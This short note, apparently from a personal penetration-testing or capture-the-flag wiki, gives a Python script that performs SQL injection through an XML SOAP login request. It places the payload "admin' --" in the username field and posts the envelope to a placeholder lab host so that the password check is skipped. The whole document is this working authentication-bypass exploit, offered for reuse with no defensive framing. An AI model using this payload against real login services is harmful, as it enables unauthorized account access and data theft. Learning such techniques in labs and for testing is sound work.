 [[SQLi]]

# SQLi using #xml 
```python
import requests

payload = "admin' --"
data = f'<?xml version="1.0" encoding="UTF-8"?> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:tns="http://tempuri.org/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <soap:Body> <LoginRequest xmlns="http://tempuri.org/"> <username>{payload}</username> <password>fff</password> </LoginRequest> </soap:Body> </soap:Envelope>'

print(requests.post("http://STMIP:3002/wsdl", data=data, headers={"SOAPAction":'"Login"'}).content)
```
